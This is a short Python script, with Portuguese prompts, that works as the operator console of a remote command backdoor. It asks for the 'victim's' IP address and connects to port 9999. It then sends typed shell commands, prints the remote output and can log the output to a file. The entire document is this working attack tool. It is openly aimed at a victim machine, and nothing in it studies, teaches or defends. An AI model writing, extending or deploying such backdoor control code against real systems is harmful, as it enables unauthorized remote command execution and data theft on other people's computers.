from socket import *
from time import sleep

ip = input('Diga o ip da vítima: ')
opt = input('Salvar num arquivo as respostas?(s/n)').strip().lower().startswith('s')
if opt:
    nome = input('Diretorio do arquivo com seu nome: ')
porta = 9999

socket_object = socket(AF_INET, SOCK_STREAM)
socket_object.connect((ip, porta))
while True:
    try:
        print(socket_object.recv(512).decode(), end='')
        cmd = input()
        while cmd == '':
            cmd = input('>>> ')
        socket_object.send(cmd.encode())
        rd = socket_object.recv(2**15).decode()
        print(rd)
        if opt:
            with open(nome, 'a') as f:
                f.write(rd+'\n')
        if rd == "Closed!":
            socket_object.close()
            break
        sleep(1)
        cmd = ''
    except:
        break

input('Program finished, press enter to leave.  . . .     ')
